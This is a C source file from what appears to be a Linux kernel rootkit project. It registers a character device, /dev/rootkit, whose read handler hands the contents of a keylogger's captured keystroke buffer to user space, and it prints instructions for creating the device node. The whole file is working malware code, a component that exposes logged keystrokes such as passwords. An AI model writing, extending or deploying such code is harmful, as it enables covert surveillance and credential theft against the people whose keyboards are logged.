#include <linux/fs.h>
#include "fops.h"
#include "simple_rootkit.h"
#include "keylogger.h"

static ssize_t device_read(struct file *, char *, size_t, loff_t *);

// the key logging buffer from keylogger.c
extern char keystrokes[];

struct file_operations fops = {
    .read = device_read
};

int major;

int init_fops(void) {
	major = register_chrdev(0, DEVICE_NAME, &fops);
	printk(KERN_INFO "[+] major: %d\n", major);
	if (major < 0) {
		return major;
	}
	printk(KERN_INFO "[+] make a node using `sudo mknod /dev/rootkit c %d 0`\n", major);

	return 0;
}

void exit_fops(void) {
	unregister_chrdev(major, DEVICE_NAME);
	return;
}

static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset) {
    size_t count = 0;
	char *msg = keystrokes;
    if(*offset == 0) {
        while (msg[count] != 0) {
            put_user(msg[count], buffer++);
            count++;
            (*offset)++;
        }
        return count;
    } else {
        return 0;
    }
}
